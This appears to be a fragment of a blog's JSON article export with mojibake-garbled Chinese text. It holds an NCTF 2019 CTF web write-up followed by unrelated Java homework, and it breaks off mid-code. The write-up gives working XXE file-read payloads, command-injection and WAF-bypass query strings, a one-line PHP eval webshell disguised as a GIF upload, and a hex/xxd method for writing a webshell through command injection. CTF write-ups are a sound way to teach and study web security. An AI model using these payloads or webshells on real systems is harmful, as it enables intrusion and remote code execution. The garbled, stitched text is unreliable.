ç¼–å†™çˆ¬è™«åŠ¨æ€çˆ¬å–ç½‘ç«™Introä¼ ç»Ÿçš„æµè§ˆå™¨è¯·æ±‚å“åº”æ–¹å¼æ˜¯ï¼šæˆ‘ä»¬åœ¨ä¸€ä¸ªç½‘ç«™ä¸Šç‚¹å‡»äº†ä¸€ä¸ªè¯·æ±‚èµ„æºçš„æŒ‰é’®ï¼Œå°±ä¼šå¯¹æœåŠ¡å™¨å‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼Œç„¶åå“åº”å†è¿”å›åˆ°æµè§ˆå™¨ã€‚è¯¥è¯·æ±‚æ˜¯ä¸€ä¸ªå®Œæ•´çš„ HTML é¡µé¢ï¼Œå› æ­¤å½“æµè§ˆå™¨ç”¨åˆ°æ–°çš„ HTML é¡µé¢é‡ç»˜æ—¶ï¼Œå¯èƒ½ä¼šçœ‹åˆ°é—ªçƒï¼Œè¿™ä¸€æ–¹é¢å¢","link":"","raw":null,"photos":[],"categories":[{"name":"å·¥å…·","slug":"å·¥å…·","count":1,"path":"api/categories/å·¥å…·.json"}],"tags":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","count":1,"path":"api/tags/çˆ¬è™«.json"}]},{"title":"NCTF","slug":"NCTF","date":"2019-11-26T12:45:31.000Z","updated":"2020-04-29T05:45:19.118Z","comments":true,"path":"api/articles/NCTF.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"NCTF\"><a href=\"#NCTF\" class=\"headerlink\" title=\"NCTF\"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Fake-XML-cookbook\"><a href=\"#Fake-XML-cookbook\" class=\"headerlink\" title=\"Fake XML cookbook\"></a>Fake XML cookbook</h3><p>ç®€å•çš„xxe</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; \n\n&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id=\"ture-XML-cookbook\"><a href=\"#ture-XML-cookbook\" class=\"headerlink\" title=\"ture XML cookbook\"></a>ture XML cookbook</h3><p>å¸¸ç”¨çš„å†…ç½‘IPæ–‡ä»¶<code>/etc/hosts</code> ã€ <code>/proc/net/arp</code> ã€ <code>/proc/net/fib_trie</code></p>\n<p><strong>requests</strong></p>\n<pre><code>&lt;!DOCTYPE ANY [\n\n&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;\n\n]&gt;\n\n\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>X-Powered-By: PHP/7.4.0RC6\n\n\n&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>è§£å¯†ï¼š</p>\n<pre><code>Main:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST\nLocal:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST</code></pre><p>ç…§ç€Ipè®¿é—®ï¼Œåæ§½æˆ‘çš„windowsä¸‹burpå“åº”å…¨æ˜¯ä¹±ç ï¼Œæäº†åŠå¤©å»kaliå°±æ²¡äº‹äº†ã€‚</p>\n<h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__file__);\n$string_1 = $_GET[&apos;str1&apos;];\n$string_2 = $_GET[&apos;str2&apos;];\n$cmd = $_GET[&apos;q_w_q&apos;];\n\n\n//1st\nif($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){\n    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;\n}\nelse{\n    die(&apos;23333333&apos;);\n}\n\n\n//2nd\nif(is_numeric($string_1)){\n    $md5_1 = md5($string_1);\n    $md5_2 = md5($string_2);\n    if($md5_1 != $md5_2){\n        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr â€” æŸ¥æ‰¾å­—ç¬¦ä¸²çš„é¦–æ¬¡å‡ºç°ï¼Œ\n        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);\n        if($a == $b){\n            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;\n        }\n        else{\n            die(&quot;can u give me the right str???&quot;);\n        }\n    } \n    else{\n        die(&quot;no!!!!!!!!&quot;);\n    }\n}\nelse{\n    die(&apos;is str1 numeric??????&apos;);\n}\n\n\n//3rd\n$query = $_SERVER[&apos;QUERY_STRING&apos;];\nif (strlen($cmd) &gt; 8){\n    die(&quot;too long :(&quot;);\n}\n\nif( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){\n    $arr = explode(&apos; &apos;, $cmd);          //explode â€” ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²\n    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){\n        if(substr_count($cmd, &apos;cat&apos;) === 0){\n            system($cmd);\n        }\n        else{\n            die(&apos;ban cat :) &apos;);\n        }\n    }\n    else{\n        die(&apos;bad guy!&apos;);\n    }\n}\nelse{\n    die(&apos;nonono _ is bad&apos;);\n}\n?&gt; </code></pre><p>ç¬¬ä¸€å±‚ä½¿ç”¨ %0a æˆªæ–­ç»•è¿‡ï¼Œç¬¬äºŒå±‚md5ç»•è¿‡<a href=\"https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83\" target=\"_blank\" rel=\"noopener\">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> å‰é¢å‡ æ¡0eå¼€å¤´çš„å­—ç¬¦ä¸²å»è§£å¯†å‘ç°éƒ½æ”¶è´¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ <code>s878926199a</code> ,åŠ å¯†å®Œè§£å¯†å¾— <code>2120624</code> ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ•°å­—ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œç¬¬ä¸‰å±‚ ä½¿ç”¨ <code>.</code> ç»•è¿‡ <code>_</code> ï¼Œ<code>%20</code> æ›¿ä»£ç©ºæ ¼ï¼Œä½¿ç”¨<code>l${x}s</code> åˆ—ç›®å½•ï¼Œ<code>tac%20f*</code> è¯» <code>flag</code> .</p>\n<p>çœ‹ä¸€ä¸ª <code>strstr()</code> çš„ä¾‹å­</p>\n<pre><code>$email  = &apos;name@example.com&apos;;\n$domain = strstr($email, &apos;@&apos;);\necho $domain.&quot;\\r\\n&quot;; // æ‰“å° @example.com\n\n$user = strstr($email, &apos;@&apos;, true); // ä» PHP 5.3.0 èµ·\necho $user.&quot;\\r\\n&quot;; // æ‰“å° name\nvar_dump(&quot;01&quot;==true);\n\nè¾“å‡ºï¼š\n@example.com\nname\nbool(true)</code></pre><p>payload:</p>\n<pre><code>?num=23333%0a\n&amp;str1=2120624\n&amp;str2=s214587387a\n&amp;q.w.q=tac%20f*</code></pre><h3 id=\"hacker-backdoor\"><a href=\"#hacker-backdoor\" class=\"headerlink\" title=\"hacker backdoor\"></a>hacker backdoor</h3><pre><code> &lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){\n    highlight_file(__file__);\n}\n$code = $_GET[&apos;code&apos;];\n$usrful = $_GET[&apos;useful&apos;];\n\nfunction waf($a){\n    $dangerous = get_defined_functions();    //get_defined_functions â€” è¿”å›æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„\n    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //å‹å…¥æ ˆåº•\n    foreach ($dangerous[&quot;internal&quot;] as $bad) {\n        if(strpos($a,$bad) !== FALSE){\n        return False;\n        break;\n        }\n    }\n    return True;\n}\n\nif(file_exists($usrful)){\n    if(waf($code)){\n        eval($code);\n    }\n    else{\n        die(&quot;oh,ä¸èƒ½è¾“å…¥è¿™äº›å‡½æ•°å“¦ :) &quot;);\n    }\n}</code></pre><p>æµ‹è¯•ä¸€ä¸‹$dangerous</p>\n<pre><code>&lt;?php  \n$dangerous = get_defined_functions();\narray_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);\nforeach ($dangerous[&quot;internal&quot;] as $bad) { \n    if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){\n        echo &quot;badbad&quot;.&quot;\\r\\n&quot;;\n    }\n}\n?&gt;</code></pre><p>ä½¿ç”¨å‘½ä»¤æ‹¼æ¥ç»•è¿‡ waf()</p>\n<pre><code>?code=?&gt;&lt;?php $a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;\n&amp;useful=index.php</code></pre><p>disable_functiongs:</p>\n<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>ä»¤æ‰§è¡Œåˆ©ç”¨åŠç»•è¿‡å§¿åŠ¿ã€€ã€€</p>\n<p>å†™å…¥webshell:</p>\n<p>åˆ©ç”¨å‘½ä»¤æ³¨å…¥å†™ä¸€å¥è¯php webshellåˆ°webç›®å½•æ¶‰åŠåˆ°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„è½¬ä¹‰ï¼Œå‡è®¾éœ€è¦å†™å…¥<?php eval($_POST[kang]); ?>ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š<br>WINDOWSï¼šç”¨^è½¬ä¹‰&lt;ï¼Œå³æ‰§è¡Œecho ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; webå¯å†™ç›®å½•åŠ æ–‡ä»¶å®Œæ•´åå­—</p>\n<p>linuxä¸‹éœ€è¦ç”¨\\æ¥è½¬ä¹‰&lt;ï¼Œä¸è¿‡å¾ˆå¤šphpéƒ½é»˜è®¤å¼€å¯gpcï¼ˆé­”æœ¯å¼•å·magic_quotes_gpc()ï¼‰ã€‚å¯ä»¥å…ˆç”¨16è¿›åˆ¶è½¬æ¢ä¸€å¥è¯å†ç”¨xxdå‘½ä»¤æŠŠ16è¿›åˆ¶è¿˜åŸï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; webå¯å†™ç›®å½•åŠ æ–‡ä»¶å®Œæ•´åå­—</p>\n<p>| å‘½ä»¤ç®¡é“ç¬¦</p>\n<p>&lt;&gt;&gt;&gt; æ–‡ä»¶é‡å®šå‘ç¬¦</p>\n<p>æµ‹è¯•ï¼š 0 | dir c:</p>\n<p>ã€€ã€€ä»£ç åªè¿‡æ»¤äº†éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œå¯ä»¥è€ƒè™‘ç”¨å…¶ä»–å­—ç¬¦è¿›è¡Œæµ‹è¯•ï¼Œè¿™è¾¹åˆ—ä¸¾ä¸€ä¸‹Window/Linuxå¯åˆ©ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼š</p>\n<p>windowsæ”¯æŒï¼š</p>\n<p>|     ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥      ping 127.0.0.1|whoami          </p>\n<p>||    å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡       ping  2 || whoami </p>\n<p>&amp;   å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡                       ping 127.0.0.1&amp;whoami</p>\n<p>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ    ping 127.0.0.1&amp;&amp;whoami</p>\n<p>Linuxæ”¯æŒ(æ¯”ä¸Šé¢å¤šä¸€ä¸ª):</p>\n<p>;     å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„      ping 127.0.0.1;whoami  </p>\n<h3 id=\"upload-your-shell\"><a href=\"#upload-your-shell\" class=\"headerlink\" title=\"upload your shell\"></a>upload your shell</h3><p>æ‰“å¼€é¢˜ç›®åœ¨å¤´åƒé‚£é‡Œå¾— image æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œå…ˆä¸Šä¼ </p>\n<pre><code>&lt;?php \n    @eval($_POST[shell]);\n     ?&gt;</code></pre><p>æç¤º <code>&lt;?</code> ï¼Œç„¶åç›´æ¥æ‹¿ä¸Šæ¬¡ SUCTF ç”¨å‰©ä¸‹å¾—é©¬</p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    #system(&apos;cat /flag&apos;);\n    @eval($_POST[shell]);\n&lt;/script&gt;</code></pre><p>ç„¶åå†ä¿®æ”¹ content-type ï¼Œä¼ å®Œå¾—åˆ°å›¾ç‰‡è·¯å¾„ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œè§‚å¯Ÿåˆ°é“¾æ¥ä¸º </p>\n<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>äºæ˜¯è®¿é—®</p>\n<pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>å³å¯</p>\n<h3 id=\"replace\"><a href=\"#replace\" class=\"headerlink\" title=\"replace\"></a>replace</h3><p>æ–‡å­—æ›¿æ¢å·¥å…·ï¼Œhintï¼š<code>ä½¿ç”¨php5.6+bootstrapè¿›è¡Œå¼€å‘</code> ï¼ŒçŒœæµ‹ <code>preg_replace</code> çš„ <code>/e</code> ä»£ç æ‰§è¡Œã€‚</p>\n<p>ç¬¬ä¸‰ä¸ªæ¡†å†…çš„å†…å®¹åº”è¯¥å°±æ˜¯ /eçš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬è¾“å…¥ <code>var_dump(111)</code> ï¼ŒæˆåŠŸæ‰“å° <code>int(111)</code> ï¼Œè¾“å…¥å•å¼•å·åŒå¼•å·éƒ½ä¼šè¢«è¿‡æ»¤ï¼Œå¯ä»¥åˆ©ç”¨ chr() æ¥ç»•è¿‡ã€‚</p>\n<p>æˆ‘ä»¬è¾“å…¥scandir(chr(47)) å‘ç°åˆ—ä¸äº†ç›®å½•ã€‚ç›´æ¥è¯»æ–‡ä»¶ </p>\n<pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>","text":"NCTF11/26/2019 8:45:31 PM WEBFake XML cookbookç®€å•çš„xxe&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]},{"title":"java","slug":"java-tests","date":"2019-11-26T01:26:49.000Z","updated":"2019-12-01T12:59:07.431Z","comments":true,"path":"api/articles/java-tests.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"java-tests\"><a href=\"#java-tests\" class=\"headerlink\" title=\"java-tests\"></a>java-tests</h1><p>11/26/2019 9:26:49 AM </p>\n<h2 id=\"charper-two\"><a href=\"#charper-two\" class=\"headerlink\" title=\"charper two\"></a>charper two</h2><ul>\n<li>è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¾“å‡ºé˜¶ä¹˜æœ€å³è¾¹çš„é0æ•°å­—</li>\n</ul>\n<pre><code>package the_second_chapter;\n\nimport java.math.BigInteger;\nimport java.util.Scanner;\n\npublic class first_one {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    //int sum = 0,temp = 1;\n    BigInteger num = new BigInteger(&quot;1&quot;);\n    System.out.println(&quot;ä½ æƒ³ç®—å¤šå°‘çš„é˜¶ä¹˜?&quot;);\n    Scanner scn = null;//é˜²æ­¢ Scanner is never closed çš„é”™è¯¯\n    try {\n        scn = new Scanner(System.in);\n        int num1 = scn.nextInt();\n        for(int number=1;number&lt;=num1;number++)\n        {\n            num = num.multiply(new BigInteger(number + &quot;&quot;));\n        }\n        System.out.println(num);\n    }\n    finally {\n        if(scn!=null)\n            scn.close();\n    }\n    char[] c = num.toString().toCharArray();              \n    System.out.println(num.toString().length());        //è¾“å‡ºé•¿åº¦\n    for(int b=num.toString().length()-1;b&gt;=0;b--) {        //åˆ¤æ–­é0\n        if(c[b]!=&apos;0&apos;) {\n            System.out.println(c[b]);\n            return;\n        }\n    }\n}\n\n}</code></pre><blockquote>\n<p>String.ToCharArray Method</p>\n<p>Definition</p>\n<p>Namespace: System</p>\n<p>Assemblies: System.Runtime.dll, mscorlib.dll, netstandard.dll</p>\n<p>Copies the characters in this instance(å®ä¾‹) to a Unicode character array.</p>\n<p><a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8</a></p>\n</blockquote>\n<ul>\n<li>è¾“å…¥ä¸€ç»„æ•°å­—ä¿å­˜åœ¨æ•°ç»„ä¸­ï¼Œé‡åˆ°0è¡¨ç¤ºè¾“å…¥ç»“æŸï¼Œå°†è¾“å…¥çš„æ•°ç»„é€†åºè¾“å‡º</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\n\npublic class test_9 {\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner input=new Scanner(System.in);\n    int[] num=new int[20];\n    int i;\n    for(i=0;;i++)\n    {\n        int a=input.nextInt();\n        if(a==0)\n            break;\n        num[i]=a;\n    }\n    for(i=i-1;i&gt;=0;i--)\n    {\n        System.out.print(num[i]);\n        if(i!=0)\n            System.out.print(&quot; &quot;);\n    }\n    System.out.println();\n}\n}</code></pre><ul>\n<li>è¶…çº§é€’å¢åºåˆ—</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\n\npublic class test_10 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scn = new Scanner(System.in);\n    int[] num = new int[20];\n    int i,flag=0;\n    int sum=0;\n    for(i=0;;i++) {\n        int a = scn.nextInt();\n        if(a==-999)\n            break;\n        num[i] = a;\n    }\n    for(int j=0;j&lt;num.length;j++) {\n        sum += num[j];\n        if(sum&lt;num[j+1])\n            flag=1;\n        else {\n            flag=2;\n            break;\n        }\n    if(flag==1) {\n        System.out.print(&quot;è¶…çº§é€’å¢ï¼&quot;);\n\n    }\n    else {\n        System.out.print(&quot;ä¸æ˜¯è¶…çº§é€’å¢&quot;);\n    }\n    }\n}\n\n}</code></pre><ul>\n<li>ç»Ÿè®¡å­—ç¬¦ä¸²ä¸­å•è¯ä¸ªæ•°</li>\n</ul>\n<pre><code>package the_second_chapter;\nimport java.util.Scanner;\npublic class test_11 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scanner = new Scanner(System.in);\n    String s = scanner.nextLine();\n    String []arr = s.split(&quot; &quot;);\n    int count = 0;\n    for (int i = 0;i&lt;arr.length;i++){\n        for (int j = i+1;j&lt;arr.length;j++){\n            if (arr[i].equals( arr[j])){\n                arr[j] = &quot; &quot;;\n            }\n        }\n    }\n    for (int i = 0;i&lt;arr.length;i++){\n        System.out.println(arr[i]);\n    }\n    for (int i = 0;i&lt;arr.length;i++){\n        if (arr[i] != &quot; &quot;){\n            count++;\n        }\n    }\n    System.out.println(count);\n}\n\n}</code></pre><h2 id=\"third-chapter\"><a href=\"#third-chapter\" class=\"headerlink\" title=\"third_chapter\"></a>third_chapter</h2><ul>\n<li>ä¿®æ”¹æ–‡ä»¶åç§°</li>\n</ul>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\npublic class test_4 {\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n    Scanner scn = new Scanner(System.in);\n    System.out.print(&quot;è¯·è¾“å…¥æ—§æ–‡ä»¶è·¯å¾„åŠåç§°(D:\\\\test.txt)ï¼š&quot;);\n    String old_path = scn.next();\n    File old_file = new File(old_path);\n    System.out.print(&quot;è¯·è¾“å…¥æ–°æ–‡ä»¶åç§°(D:\\\\test1.txt)ï¼š&quot;);\n    String new_path = scn.next();\n    File new_file = new File(new_path);\n    if(old_file.exists() &amp;&amp; !new_file.exists()) {\n        old_file.renameTo(new_file);\n        System.out.print(&quot;reanme successful!&quot;);\n    }\n    else {\n        System.out.print(&quot;rename failue!&quot;);\n    }\n}\n\n}</code></pre><ul>\n<li><p>å®ç°copyå‘½ä»¤</p>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\npublic class test_6 {\n\npublic static void main(String[] args) throws FileNotFoundException {\n    // TODO Auto-generated method stub\n    try {\n    Scanner scn = new Scanner(System.in);\n    //è¾“å…¥æ–‡ä»¶å\n    System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);\n    String old_file = scn.next();\n    FileReader old_one = new FileReader(old_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡\n    BufferedReader old_one_cont = new BufferedReader(old_one);//è¯»æ–‡ä»¶\n    System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶åˆ°çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);\n    String new_file = scn.next();\n    FileWriter new_one = new FileWriter(new_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡\n    BufferedWriter new_one_cont = new BufferedWriter(new_one);//è¯»æ–‡ä»¶\n    String content = null;\n    while((content = old_one_cont.readLine())!=null) {\n        new_one_cont.write(content);\n        new_one_cont.newLine();\n    }\n    //å…³é—­æ–‡ä»¶\n    new_one_cont.flush();\n    new_one_cont.close();\n    new_one.close();\n\n    }\n    catch(IOException e) {\n        System.out.print(e.toString());\n    }\n}\n\n}</code></pre></li>\n</ul>\n<ul>\n<li><p>å®ç°åˆ é™¤æ³¨é‡ŠåŠŸèƒ½</p>\n<pre><code>package third_chapter;\nimport java.io.*;\nimport java.util.*;\n/**\n * @author brian\n *\n * @date: 2019å¹´12æœˆ1æ—¥ ä¸Šåˆ10:57:42\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\npublic class test_8 {\n\n    /**\n     * @param args\n     * @throws FileNotFoundException \n     */\n    public static void main(String[] args) throws FileNotFoundException {\n        // TODO Auto-generated method stub\n        try {\n        Scanner scn = new Scanner(System.in);\n        System.out.println(&quot;è¯·è¾“å…¥è¦åˆ é™¤æ³¨é‡Šçš„æ–‡ä»¶è·¯å¾„åŠæ–‡ä»¶åï¼š&quot;);\n        String old_file = scn.next();\n        FileReader old_one = new FileReader(old_file);\n        BufferedReader old_cont = new BufferedReader(old_one);\n        System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶åˆ°çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);\n        String new_file = scn.next();\n        FileWriter new_one = new FileWriter(new_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡\n        BufferedWriter new_one_cont = new BufferedWriter(new_one);//è¯»æ–‡ä»¶\n        String content = null;\n        while((content = old_cont.readLine())!=null) {\n            /**åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨é‡Š\n             * trim(): å°†è°ƒç”¨è¯¥æ–¹æ³•çš„Stringçš„å‰åç©ºæ ¼åˆ é™¤ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²\n             * indexOf(): æŸ¥æ‰¾å‚æ•°å­—ç¬¦ä¸²åœ¨è°ƒç”¨æ”¹æ–¹æ³•çš„Stringä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå‚æ•°å­—ç¬¦ä¸²ä¸å­˜åœ¨è¿”å›-1\n             * &amp; ï¼šä¸è¿ç®—ï¼Œä¸¤è¾¹éƒ½æ˜¯trueæ—¶ç»“æœä¸ºtrue\n             * | ï¼šæˆ–è¿ç®—ï¼Œä¸¤è¾¹ä»»æ„ä¸€ä¸ªä¸ºtrueï¼Œç»“æœä¸ºtrueï¼Œéƒ½ä¸æ˜¯trueï¼Œç»“æœä¸ºfalse\n             */\n            if((content.trim().indexOf(&quot;//&quot;)==-1)&amp;(content.trim().indexOf(&quot;/*&quot;)==-1)&amp;(content.trim().indexOf(&quot;*/&quot;)==-1)) {\n                System.out.println(content);\n                new_one_cont.write(content);\n                new_one_cont.newLine();\n            }\n                //System.out.print(content+&quot;\\n&quot;);\n        }\n        //å…³é—­æ–‡ä»¶\n        new_one_cont.flush();\n        new_one_cont.close();\n        new_one.close();\n    } catch (IOException e) {\n            // TODO Auto-generated catch block\n        